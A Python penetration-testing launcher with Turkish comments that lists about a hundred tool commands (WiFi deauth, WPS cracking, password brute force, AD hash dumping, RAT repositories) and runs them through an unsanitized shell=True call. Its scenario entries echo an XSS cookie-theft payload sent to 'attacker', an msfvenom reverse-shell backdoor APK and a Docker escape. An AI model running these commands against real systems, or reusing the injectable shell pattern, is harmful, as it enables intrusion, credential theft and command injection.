#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Dict, List, Optional, Any
from dataclasses import dataclass
import subprocess
import threading
import queue

@dataclass
class Tool:
    """Araç tanımı."""
    tool_id: int
    name: str
    category: str
    command: str
    description: str = ""
    requires_root: bool = False

class ToolManager:
    """Araç yönetim sınıfı."""
    
    def __init__(self):
        self.tools: Dict[int, Tool] = {}
        self.categories: Dict[str, List[int]] = {}
        self._load_builtin_tools()
    
    def _load_builtin_tools(self):
        """Yerleşik araçları yükler."""
        
        # ============================================
        # WiFi Araçları (1-10)
        # ============================================
        wifi_tools = [
            Tool(1, "Airodump-ng - Kablosuz Ağ Tarama", "WiFi", "airodump-ng {interface}", "Kablosuz ağları tarar", True),
            Tool(2, "Aireplay-ng - Bağlantı Kesme", "WiFi", "aireplay-ng -0 0 -a {bssid} {interface}", "Deauth saldırısı", True),
            Tool(3, "Wifite - Otomatik Saldırı", "WiFi", "wifite --kill", "Otomatik WiFi saldırısı", True),
            Tool(4, "Bettercap - Ağ Keşfi", "WiFi", "bettercap -eval 'wifi.recon on'", "Bettercap WiFi keşif", True),
            Tool(5, "MDK4 - Beacon Saldırısı", "WiFi", "mdk4 {interface} b -s 500", "Sahte ağ oluşturma", True),
            Tool(6, "Reaver - WPS Kırma", "WiFi", "reaver -i {interface} -b {bssid} -vv", "WPS PIN kırma", True),
            Tool(7, "Kismet - Pasif Keşif", "WiFi", "kismet -c {interface}", "Pasif WiFi keşif", True),
            Tool(8, "Airgeddon - WiFi Çerçevesi", "WiFi", "airgeddon", "Çok amaçlı WiFi aracı", True),
            Tool(9, "Wash - WPS Ağ Tarama", "WiFi", "wash -i {interface}", "WPS etkin ağları bulur", True),
            Tool(10, "HCXDumpTool - Paket Yakalama", "WiFi", "hcxdumptool -i {interface} -o capture.pcapng", "WPA paket yakalama", True),
        ]
        for t in wifi_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("WiFi", []).append(t.tool_id)
        
        # ============================================
        # OSINT Araçları (11-20)
        # ============================================
        osint_tools = [
            Tool(11, "Nmap - Hızlı Tarama", "OSINT", "nmap -T4 -F {target}", "Hızlı port taraması"),
            Tool(12, "Nmap - Ayrıntılı Tarama", "OSINT", "nmap -sV -sC -O {target}", "Detaylı servis taraması"),
            Tool(13, "Sherlock - Kullanıcı Adı Arama", "OSINT", "sherlock {target}", "Sosyal medya taraması"),
            Tool(14, "TheHarvester - E-posta/Domain", "OSINT", "theHarvester -d {domain} -b all", "E-posta adresi toplama"),
            Tool(15, "Amass - Alt Domain Keşfi", "OSINT", "amass enum -d {domain}", "Subdomain keşfi"),
            Tool(16, "Subfinder - Alt Domain Bulma", "OSINT", "subfinder -d {domain}", "Hızlı subdomain tarama"),
            Tool(17, "Holehe - E-posta Denetimi", "OSINT", "holehe {target}", "E-posta hesap kontrolü"),
            Tool(18, "Maigret - Sosyal Medya Tarama", "OSINT", "maigret {target}", "Kullanıcı adı sorgulama"),
            Tool(19, "Recon-ng - Web Keşif", "OSINT", "recon-ng", "Web tabanlı keşif"),
            Tool(20, "Whois - Domain Sorgulama", "OSINT", "whois {domain}", "Domain bilgileri"),
        ]
        for t in osint_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("OSINT", []).append(t.tool_id)
        
        # ============================================
        # Web Araçları (21-30)
        # ============================================
        web_tools = [
            Tool(21, "SQLMap - SQL Enjeksiyon", "Web", "sqlmap -u {target} --batch --dbs", "Otomatik SQL injection"),
            Tool(22, "Gobuster - Dizin Tarama", "Web", "gobuster dir -u {target} -w {wordlist}", "Dizin keşfi"),
            Tool(23, "FFUF - Web Fuzzing", "Web", "ffuf -u {target}/FUZZ -w {wordlist}", "Hızlı web fuzzer"),
            Tool(24, "WPScan - WordPress Tarama", "Web", "wpscan --url {target}", "WordPress güvenlik taraması"),
            Tool(25, "Nikto - Web Sunucu Tarama", "Web", "nikto -h {target}", "Web sunucu açıklıkları"),
            Tool(26, "Nuclei - Zafiyet Tarayıcı", "Web", "nuclei -u {target}", "Şablon tabanlı tarama"),
            Tool(27, "XSStrike - XSS Tarayıcı", "Web", "xsstrike -u {target}", "Gelişmiş XSS tespiti"),
            Tool(28, "Dirb - Dizin Keşfi", "Web", "dirb {target} {wordlist}", "Klasik dizin tarama"),
            Tool(29, "WhatWeb - Teknoloji Tanıma", "Web", "whatweb {target}", "Web teknolojilerini tanır"),
            Tool(30, "Commix - Komut Enjeksiyon", "Web", "commix --url {target}", "Command injection testi"),
        ]
        for t in web_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Web", []).append(t.tool_id)

        # ============================================
        # Exploit Araçları (31-35)
        # ============================================
        exploit_tools = [
            Tool(31, "Metasploit - Sızma Çerçevesi", "Exploit", "msfconsole -q", "Metasploit Framework", True),
            Tool(32, "SearchSploit - Açıklık Arama", "Exploit", "searchsploit {target}", "Exploit-DB araması"),
            Tool(33, "Hydra - Kaba Kuvvet", "Exploit", "hydra -l {user} -P {wordlist} {target} {service}", "Parola deneme"),
            Tool(34, "John - Parola Kırma", "Exploit", "john --wordlist={wordlist} {hash}", "John the Ripper"),
            Tool(35, "Hashcat - GPU Parola Kırma", "Exploit", "hashcat -m 0 {hash} {wordlist}", "GPU destekli kırma"),
        ]
        for t in exploit_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Exploit", []).append(t.tool_id)
        
        # ============================================
        # AD Araçları (36-40)
        # ============================================
        ad_tools = [
            Tool(36, "BloodHound - AD Keşif", "AD", "bloodhound-python -d {domain} -u {user} -p '{password}' -c All", "Active Directory haritalama"),
            Tool(37, "Evil-WinRM - Uzak Kabuk", "AD", "evil-winrm -i {target} -u {user} -p '{password}'", "Windows Remote Management"),
            Tool(38, "Impacket-secretsdump", "AD", "secretsdump.py {domain}/{user}:{password}@{target}", "Hash dökme aracı"),
            Tool(39, "Impacket-psexec", "AD", "psexec.py {domain}/{user}:{password}@{target}", "Uzaktan komut çalıştırma"),
            Tool(40, "Kerberoast", "AD", "GetUserSPNs.py {domain}/{user}:{password} -request", "Kerberoasting saldırısı"),
        ]
        for t in ad_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("AD", []).append(t.tool_id)
        
        # ============================================
        # Cloud Araçları (41-45)
        # ============================================
        cloud_tools = [
            Tool(41, "Trivy - Konteyner Tarama", "Cloud", "trivy image {docker_image}", "Docker imaj tarayıcı"),
            Tool(42, "Prowler - AWS Denetim", "Cloud", "prowler aws", "AWS güvenlik denetimi"),
            Tool(43, "ScoutSuite - Çoklu Bulut", "Cloud", "scout aws", "AWS/Azure/GCP denetimi"),
            Tool(44, "Kubescape - K8s Güvenlik", "Cloud", "kubescape scan", "Kubernetes güvenlik taraması"),
            Tool(45, "TruffleHog - Gizli Anahtar", "Cloud", "trufflehog filesystem .", "Gizli anahtar tarayıcı"),
        ]
        for t in cloud_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Cloud", []).append(t.tool_id)

        # ============================================
        # DarkWeb Araçları (46-55)
        # ============================================
        darkweb_tools = [
            Tool(46, "OnionSearch - Onion Arama", "DarkWeb", "onionsearch {query}", "Dark web arama motoru"),
            Tool(47, "Tor Browser", "DarkWeb", "torbrowser-launcher", "Tor tarayıcı başlat"),
            Tool(48, "Ahmia - Onion Arama", "DarkWeb", "xdg-open https://ahmia.fi/search?q={query}", "Ahmia arama motoru"),
            Tool(49, "DarkDump - Veri Sızıntısı", "DarkWeb", "darkdump --query {query}", "Dark web veri arama"),
            Tool(50, "Onioff - Onion Bağlantı", "DarkWeb", "onioff {target}", "Onion site durum kontrolü"),
            Tool(51, "TorBot - Site Tarama", "DarkWeb", "torbot -u {target}", "Onion site tarayıcı"),
            Tool(52, "OnionScan - Güvenlik", "DarkWeb", "onionscan {target}", "Onion güvenlik taraması"),
            Tool(53, "OnionShare - Dosya Paylaşım", "DarkWeb", "onionshare", "Anonim dosya paylaşımı"),
            Tool(54, "Ricochet - Anlık Mesaj", "DarkWeb", "ricochet", "Anonim mesajlaşma"),
            Tool(55, "ZeroNet", "DarkWeb", "zeronet", "Merkeziyetsiz web"),
        ]
        for t in darkweb_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("DarkWeb", []).append(t.tool_id)

        # ============================================
        # Blockchain Araçları (56-65)
        # ============================================
        blockchain_tools = [
            Tool(56, "Mythril - Akıllı Sözleşme", "Blockchain", "myth analyze {contract_addr}", "Ethereum güvenlik analizi"),
            Tool(57, "Slither - Statik Analiz", "Blockchain", "slither {contract_addr}", "Solidity statik analiz"),
            Tool(58, "Echidna - Fuzzing", "Blockchain", "echidna-test {contract_addr}", "Akıllı sözleşme fuzzer"),
            Tool(59, "Manticore - Sembolik", "Blockchain", "manticore {contract_addr}", "Sembolik yürütme"),
            Tool(60, "Oyente - Analiz", "Blockchain", "oyente -s {contract_addr}", "Ethereum analiz"),
            Tool(61, "Octopus - Analiz", "Blockchain", "octopus {contract_addr}", "Sözleşme analizi"),
            Tool(62, "Solhint - Linter", "Blockchain", "solhint {file}", "Solidity kod kalitesi"),
            Tool(63, "Surya - Görselleştirme", "Blockchain", "surya graph {file}", "Sözleşme grafiği"),
            Tool(64, "NFT Tarayıcı", "Blockchain", "echo 'NFT analizi: https://opensea.io'", "NFT dolandırıcılık tespiti"),
            Tool(65, "Wallet Tarayıcı", "Blockchain", "echo 'Cüzdan analizi: https://etherscan.io'", "Kripto cüzdan kontrolü"),
        ]
        for t in blockchain_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Blockchain", []).append(t.tool_id)

        # ============================================
        # IoT Araçları (66-75)
        # ============================================
        iot_tools = [
            Tool(66, "IoTSeeker - Keşif", "IoT", "iotseeker {target}", "IoT cihaz keşfi"),
            Tool(67, "BTLEJack - BLE Saldırı", "IoT", "btlejack -d /dev/ttyACM0", "Bluetooth Low Energy"),
            Tool(68, "KillerBee - ZigBee", "IoT", "zbstumbler -c {channel}", "ZigBee ağ tarama"),
            Tool(69, "HackRF - SDR", "IoT", "hackrf_transfer -r capture.iq", "Radyo sinyal yakalama"),
            Tool(70, "Blueborne Tarayıcı", "IoT", "echo 'Blueborne taraması yapılıyor...'", "Blueborne zafiyeti"),
            Tool(71, "Routersploit", "IoT", "rsf.py", "Router exploit çerçevesi"),
            Tool(72, "PRET - Yazıcı", "IoT", "pret {target} pjl", "Yazıcı exploit"),
            Tool(73, "Mirai Tarayıcı", "IoT", "echo 'Mirai botnet taraması...'", "Mirai botnet tarama"),
            Tool(74, "IoT Inspector", "IoT", "iot-inspector", "Ağ trafiği analizi"),
            Tool(75, "Firmware Mod Kit", "IoT", "ext-firmware {file}", "Firmware analizi"),
        ]
        for t in iot_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("IoT", []).append(t.tool_id)

        # ============================================
        # Forensic Araçları (76-85)
        # ============================================
        forensic_tools = [
            Tool(76, "Autopsy - Adli Bilişim", "Forensic", "autopsy", "Disk imaj analizi"),
            Tool(77, "Volatility - Bellek Analizi", "Forensic", "volatility -f {image} imageinfo", "RAM imaj analizi"),
            Tool(78, "Binwalk - Firmware", "Forensic", "binwalk {file}", "Firmware analizi"),
            Tool(79, "Ghidra - Tersine Mühendislik", "Forensic", "ghidra", "NSA tersine mühendislik aracı"),
            Tool(80, "TestDisk - Kurtarma", "Forensic", "testdisk {device}", "Disk kurtarma"),
            Tool(81, "ExifTool - Meta Veri", "Forensic", "exiftool {file}", "Dosya meta verileri"),
            Tool(82, "Foremost - Dosya Kurtarma", "Forensic", "foremost -i {image} -o output", "Silinmiş dosya kurtarma"),
            Tool(83, "Strings - Metin Çıkarma", "Forensic", "strings {file}", "Binary'den metin çıkarma"),
            Tool(84, "Bulk Extractor", "Forensic", "bulk_extractor {image} -o output", "E-posta/URL çıkarma"),
            Tool(85, "Steghide - Steganografi", "Forensic", "steghide extract -sf {file}", "Gizli veri çıkarma"),
        ]
        for t in forensic_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Forensic", []).append(t.tool_id)

        # ============================================
        # Spyware Araçları (86-95)
        # ============================================
        spyware_tools = [
            Tool(86, "QuasarRAT - Analiz", "Spyware", "echo 'GitHub: https://github.com/quasar/Quasar'", "Açık kaynak RAT"),
            Tool(87, "AsyncRAT - Analiz", "Spyware", "echo 'GitHub: https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp'", "C# RAT analizi"),
            Tool(88, "VenomRAT - Analiz", "Spyware", "echo 'GitHub: https://github.com/VenomRAT/VenomRAT'", "Venom RAT analizi"),
            Tool(89, "PupyRAT - Analiz", "Spyware", "echo 'GitHub: https://github.com/n1nj4sec/pupy'", "Python RAT analizi"),
            Tool(90, "CHAOS - Analiz", "Spyware", "echo 'GitHub: https://github.com/tiagorlampert/CHAOS'", "Go RAT analizi"),
            Tool(91, "Merlin C2", "Spyware", "echo 'GitHub: https://github.com/Ne0nd0g/merlin'", "HTTP/2 C2 framework"),
            Tool(92, "Covenant C2", "Spyware", "echo 'GitHub: https://github.com/cobbr/Covenant'", ".NET C2 framework"),
            Tool(93, "EvilOSX", "Spyware", "echo 'GitHub: https://github.com/Marten4n6/EvilOSX'", "macOS RAT"),
            Tool(94, "Stitch", "Spyware", "echo 'GitHub: https://github.com/nathanlopez/Stitch'", "Python RAT"),
            Tool(95, "EggShell", "Spyware", "echo 'GitHub: https://github.com/neoneggplant/EggShell'", "iOS/macOS RAT"),
        ]
        for t in spyware_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Spyware", []).append(t.tool_id)

        # ============================================
        # Scenarios Araçları (96-105)
        # ============================================
        scenarios_tools = [
            Tool(96, "WiFi WPA Kırma", "Scenarios", "echo '1. airodump-ng wlan0mon\n2. aireplay-ng deauth\n3. aircrack-ng capture.cap -w wordlist.txt'", "WPA parola kırma senaryosu"),
            Tool(97, "SQL Injection", "Scenarios", "echo 'sqlmap -u http://target/page?id=1 --dbs'", "Veritabanı dökme senaryosu"),
            Tool(98, "XSS Çalma", "Scenarios", "echo '<script>fetch(\"http://attacker/\"+document.cookie)</script>'", "Cookie çalma senaryosu"),
            Tool(99, "AD Yetki Yükseltme", "Scenarios", "echo '1. BloodHound keşif\n2. Kerberoasting\n3. Pass-the-Hash'", "Domain Admin olma"),
            Tool(100, "Docker Kaçış", "Scenarios", "echo 'docker run -v /:/host -it alpine chroot /host'", "Konteyner kaçış senaryosu"),
            Tool(101, "Dark Web OSINT", "Scenarios", "echo 'onionsearch \"hacked data\"'", "Dark web'de veri arama"),
            Tool(102, "Akıllı Sözleşme Hack", "Scenarios", "echo 'myth analyze contract.sol'", "Reentrancy açığı analizi"),
            Tool(103, "Android Backdoor", "Scenarios", "echo 'msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > backdoor.apk'", "Android payload"),
            Tool(104, "RAT Analizi", "Scenarios", "echo 'strings malware.exe | grep \"http\"'", "Zararlı yazılım analizi"),
            Tool(105, "Sızma Testi Raporu", "Scenarios", "echo '1. Keşif\n2. Zafiyet tarama\n3. Exploit\n4. Raporlama'", "Tam sızma testi"),
        ]
        for t in scenarios_tools:
            self.tools[t.tool_id] = t
            self.categories.setdefault("Scenarios", []).append(t.tool_id)

    # ============================================
    # Yardımcı Metodlar
    # ============================================
    def get_tool(self, tool_id: int) -> Optional[Tool]:
        return self.tools.get(tool_id)
    
    def get_tools_by_category(self, category: str) -> List[Tool]:
        ids = self.categories.get(category, [])
        return [self.tools[i] for i in ids if i in self.tools]
    
    def get_all_categories(self) -> List[str]:
        return list(self.categories.keys())
    
    def search_tools(self, query: str) -> List[Tool]:
        results = []
        q = query.lower()
        for tool in self.tools.values():
            if q in tool.name.lower() or q in tool.description.lower():
                results.append(tool)
        return results
    
    def run_tool(self, tool_id: int, params: Dict[str, str]) -> Dict:
        """Aracı çalıştırır."""
        tool = self.get_tool(tool_id)
        if not tool:
            return {"error": f"Araç bulunamadı: {tool_id}"}
        
        cmd = tool.command
        for key, value in params.items():
            cmd = cmd.replace(f"{{{key}}}", value)
        
        # Varsayılan değerleri doldur
        cmd = cmd.replace("{interface}", params.get("interface", "wlan0"))
        cmd = cmd.replace("{wordlist}", params.get("wordlist", "/usr/share/wordlists/rockyou.txt"))
        cmd = cmd.replace("{password}", params.get("password", ""))
        cmd = cmd.replace("{docker_image}", params.get("docker_image", ""))
        cmd = cmd.replace("{query}", params.get("query", "test"))
        cmd = cmd.replace("{contract_addr}", params.get("contract_addr", ""))
        cmd = cmd.replace("{file}", params.get("file", ""))
        cmd = cmd.replace("{image}", params.get("image", ""))
        cmd = cmd.replace("{device}", params.get("device", ""))
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            return {
                "tool": tool.name,
                "command": cmd,
                "return_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "success": result.returncode == 0
            }
        except subprocess.TimeoutExpired:
            return {"error": "Zaman aşımı (300s)"}
        except Exception as e:
            return {"error": str(e)}
